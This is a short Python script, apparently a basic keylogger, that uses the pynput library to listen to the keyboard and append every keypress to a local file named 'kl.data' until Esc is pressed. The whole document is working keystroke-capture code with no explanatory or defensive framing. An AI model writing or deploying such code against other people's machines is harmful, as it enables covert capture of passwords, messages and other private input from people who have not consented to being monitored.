#!/usr/bin/env python
import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
	file=open("kl.data",'a+')
	file.write(str(key))	
	file.close()

def on_release(key):
	if key==Key.esc:
		return False

with Listener(on_press =on_press, on_release=on_release) as listener:
	listener.join()